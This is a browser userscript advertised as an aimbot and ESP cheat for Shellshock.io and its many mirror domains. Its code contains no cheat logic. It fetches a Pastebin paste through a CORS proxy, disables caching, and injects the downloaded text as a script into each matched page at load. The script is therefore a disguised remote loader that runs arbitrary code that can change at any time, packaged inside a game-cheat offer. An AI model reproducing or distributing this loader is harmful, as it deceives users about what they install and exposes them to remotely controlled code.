// ==UserScript==
// @name         Shellshock.IO Aimbot & ESP
// @namespace    http://tampermonkey.net/
// @version      0.2.2
// @description  Locks aim to the nearest player in shellshock.io. Comes with an ESP too. Press B, V, N, L to toggle aimbot, esp, esp lines, aimbot on right mouse hold.
// @author       luh.ensis_
// @match        *://shellshock.io/*
// @match        *://algebra.best/*
// @match        *://algebra.vip/*
// @match        *://biologyclass.club/*
// @match        *://deadlyegg.com/*
// @match        *://deathegg.world/*
// @match        *://eggcombat.com/*
// @match        *://egg.dance/*
// @match        *://eggfacts.fun/*
// @match        *://egghead.institute/*
// @match        *://eggisthenewblack.com/*
// @match        *://eggsarecool.com/*
// @match        *://geometry.best/*
// @match        *://geometry.monster/*
// @match        *://geometry.pw/*
// @match        *://geometry.report/*
// @match        *://hardboiled.life/*
// @match        *://hardshell.life/*
// @match        *://humanorganising.org/*
// @match        *://mathdrills.info/*
// @match        *://mathfun.rocks/*
// @match        *://mathgames.world/*
// @match        *://math.international/*
// @match        *://mathlete.fun/*
// @match        *://mathlete.pro/*
// @match        *://overeasy.club/*
// @match        *://scrambled.best/*
// @match        *://scrambled.tech/*
// @match        *://scrambled.today/*
// @match        *://scrambled.us/*
// @match        *://scrambled.world/*
// @match        *://shellshockers.club/*
// @match        *://shellshockers.site/*
// @match        *://shellshockers.us/*
// @match        *://shellshockers.world/*
// @match        *://softboiled.club/*
// @match        *://violentegg.club/*
// @match        *://violentegg.fun/*
// @match        *://yolk.best/*
// @match        *://yolk.life/*
// @match        *://yolk.rocks/*
// @match        *://yolk.tech/*
// @match        *://zygote.cafe/*
// @icon         https://www.google.com/s2/favicons?domain=shellshock.io
// @grant        none
// @run-at       document-start
// @antifeature  ads
// ==/UserScript==
var script = document.createElement("script"); 

script.type = "text/javascript"; 

 

var proxyUrl = "https://cors-anywhere.herokuapp.com/"; 

var targetUrl = "https://pastebin.com/raw/6Mp0r4s8"; 

 

var xhr = new XMLHttpRequest(); 

xhr.open("GET", proxyUrl + targetUrl, true); 

xhr.setRequestHeader("Cache-Control", "no-cache"); 

xhr.setRequestHeader("Pragma", "no-cache"); 

xhr.setRequestHeader("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"); 

xhr.onreadystatechange = function() { 

    if (xhr.readyState === 4 && xhr.status === 200) { 

        script.text = xhr.responseText; 

        document.head.appendChild(script); 

    } 

}; 

xhr.send(); 
